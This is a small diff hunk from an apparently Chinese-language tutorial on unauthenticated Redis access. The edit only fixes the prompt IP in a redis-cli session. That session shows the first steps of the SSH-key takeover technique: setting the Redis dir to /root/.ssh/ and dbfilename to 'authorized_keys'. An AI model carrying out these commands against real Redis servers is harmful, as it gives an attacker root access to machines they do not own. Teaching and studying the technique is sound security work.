@@ -28,9 +28,9 @@ Redis 未授权访问漏洞
 
  ```
  $ redis-cli -h 172.17.0.2 -p 6379
-192.168.1.100:6379> config set dir /root/.ssh/
+172.17.0.2:6379> config set dir /root/.ssh/
 OK
-192.168.1.100:6379> config get dir
+172.17.0.2:6379> config get dir
 1) "dir"
 2) "/root/.ssh"
 172.17.0.2:6379> config set dbfilename "authorized_keys"
